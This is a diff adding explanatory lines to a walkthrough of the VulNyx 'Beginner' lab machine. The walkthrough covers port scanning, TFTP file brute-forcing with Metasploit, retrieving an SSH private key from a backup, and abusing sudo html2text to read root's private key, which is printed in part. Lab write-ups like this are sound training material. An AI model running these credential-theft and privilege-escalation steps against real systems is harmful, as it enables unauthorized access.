@@ -6,6 +6,7 @@
 ## Solution
 ### Enumeration
 #### Nmap 
+Run `nmap` to discover open port (SSH on 22, HTTP on 80).
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nmap -sCV -p- -T4 192.168.100.151    
@@ -28,9 +29,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 203.31 seconds
 ```
-
+Accessing the address `http://192.168.100.151` will display information like this:
 ![beginner-web](/walkthroughs/vulnyx/low-difficulty/beginner/beginner-web.png)
 
+Scan UDP ports to find services like **TFTP**:
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ sudo nmap -sU --top-port 100 192.168.100.151
@@ -48,6 +50,7 @@ Nmap done: 1 IP address (1 host up) scanned in 106.38 seconds
 ```
 
 ### Shell (boris)
+Use **Metasploit TFTP brute force** to list files.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ sudo msfconsole          
@@ -96,7 +99,7 @@ msf auxiliary(scanner/tftp/tftpbrute) > run
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
-
+Download `backup-config` via TFTP.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ tftp 192.168.100.151
@@ -114,7 +117,7 @@ systemd-private-3fa41340e26f403a83bdb9da043d1b5d-polkit.service-OyHYmO
 systemd-private-3fa41340e26f403a83bdb9da043d1b5d-systemd-logind.service-End0aI
 systemd-private-3fa41340e26f403a83bdb9da043d1b5d-upower.service-Ko5fp0
 ```
-
+Extract the archive to get `id_rsa` (SSH private key) and `sshd_config`.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ file backup-config 
@@ -137,9 +140,10 @@ id_rsa  sshd_config
 ┌──(dungcngo㉿kali)-[/tmp/backup]
 └─$ nano sshd_config  
 ```
-
+Checking the `sshd_config` file, we see user information named `boris`.
 ![sshd_config](/walkthroughs/vulnyx/low-difficulty/beginner/sshd-config.png)
 
+Adjust permission on `id_rsa` and connect as user `boris` via SSH.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp/backup]
 └─$ chmod 600 id_rsa
@@ -160,6 +164,7 @@ beginner
 
 ### Privilege Escalation
 #### Enumeration
+Check `sudo -l` -> `boris` can run `html2text` as root.
 ```bash
 boris@beginner:~$ sudo -l
 Matching Defaults entries for boris on beginner:
@@ -170,6 +175,7 @@ User boris may run the following commands on beginner:
     (root) NOPASSWD: /usr/bin/html2text
 ```
 #### Abuse
+Abuse it to read `/root/.ssh/id_rsa`.
 ```bash
 boris@beginner:~$ sudo html2text /root/.ssh/id_rsa
 -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAhNACeq9+AH6O1/b3OaUEEIa8/
@@ -200,7 +206,7 @@ u RWRA98sN8yc06jFezYYNw4RMk2Nfgeqd3pnNVVHRq9uBOsiOknVVFOOHsMi6IExx
 AgMuIviN7GZ1VDlPDbaYw1+8keJq4eeYRkjLpxcMDBJJwNQ8h6c= -----END RSA PRIVATE KEY--
 ---
 ```
-
+Save the private key on `id_rsa` file in `/tmp`, set permissions and SSH login as `root`.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ chmod 600 id_rsa
@@ -219,6 +225,7 @@ uid=0(root) gid=0(root) grupos=0(root)
 beginner
 ```
 #### Flags
+As `root`, locate and read flags.
 ```bash
 root@beginner:~# ls -la
 total 32
